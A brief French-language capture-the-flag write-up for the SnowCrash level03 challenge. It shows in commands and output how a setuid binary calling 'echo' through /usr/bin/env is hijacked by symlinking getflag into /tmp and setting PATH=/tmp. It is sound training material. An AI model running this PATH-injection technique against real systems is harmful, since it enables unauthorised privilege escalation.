# Level03

Le binaire dans le home nous incite à l'exploiter !

```bash
level03@SnowCrash:~$ ./level03 
Exploit me
```

Regardons de plus près avec strings

```bash
level03@SnowCrash:~$ strings ./level03 
...
/usr/bin/env echo Exploit me
...
```

Le programme semble utiliser un chemin relatif dependant du PATH, ce qui peut permettre une PATH injection

Nous créons un lien symbolique vers getflag pour duper le programme
```bash
level03@SnowCrash:~$ ln -s /bin/getflag /tmp/echo
```

L'injection:

```
level03@SnowCrash:~$ PATH=/tmp ./level03 
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXX
```
